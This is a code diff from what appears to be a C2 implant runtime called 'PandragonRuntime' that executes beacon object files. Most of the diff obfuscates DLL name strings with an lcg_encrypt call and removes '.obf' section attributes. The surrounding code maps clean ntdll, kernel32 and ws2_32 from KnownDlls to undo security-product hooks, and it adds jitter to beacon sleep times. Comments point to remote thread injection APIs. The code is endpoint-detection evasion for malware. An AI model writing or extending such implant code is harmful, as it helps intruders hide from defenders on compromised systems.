@@ -15,7 +15,6 @@ functionTable* g_functionTable = nullptr;
  * ============================================================================ */
 #undef noinline
 
-__attribute__((section(".obf"), noinline))
 uint32_t ApplySleepJitter(uint32_t sleep_ms, uint8_t jitter_pct) {
     if (jitter_pct == 0 || jitter_pct > 100) {
         return sleep_ms;
@@ -31,7 +30,6 @@ uint32_t ApplySleepJitter(uint32_t sleep_ms, uint8_t jitter_pct) {
 
     return (result < 1) ? 1 : static_cast<uint32_t>(result);
 }
-__attribute__((section(".obf"), noinline))
 void ExecuteSleep(functionTable* funcTable, uint32_t sleep_ms, uint8_t jitter_pct) {
     PandragonRuntime& runtime = PandragonRuntime::getInstance();
 
@@ -172,7 +170,7 @@ bool PandragonRuntime::ensureUnhooked() {
     g_debugPrint("[lazy_unhook] First BOF exec... mapping clean DLLs from KnownDlls...");
 
     // Map ntdll (primary for unhooking)
-    void* cleanBase = MapKnownDll(m_funcTable, "ntdll");
+    void* cleanBase = MapKnownDll(m_funcTable, lcg_encrypt("ntdll"));
     if (!cleanBase) {
         g_debugPrint("[lazy_unhook] Failed to map ntdll from KnownDlls... proceeding with hooked ntdll");
         return false;
@@ -180,13 +178,13 @@ bool PandragonRuntime::ensureUnhooked() {
 
     // Optionally map additional DLLs for BOFs that need them
     // Map kernel32 (for CreateRemoteThread, VirtualAllocEx, etc in BOFs)
-    void* kernel32Base = MapKnownDll(m_funcTable, "kernel32");
+    void* kernel32Base = MapKnownDll(m_funcTable, lcg_encrypt("kernel32"));
     if (kernel32Base) {
         g_debugPrint("[lazy_unhook] Mapped clean kernel32 at 0x%p", kernel32Base);
     }
 
     // Map ws2_32 (for socket operations in BOFs)
-    void* ws2_32Base = MapKnownDll(m_funcTable, "ws2_32");
+    void* ws2_32Base = MapKnownDll(m_funcTable, lcg_encrypt("ws2_32"));
     if (ws2_32Base) {
         g_debugPrint("[lazy_unhook] Mapped clean ws2_32 at 0x%p", ws2_32Base);
     }
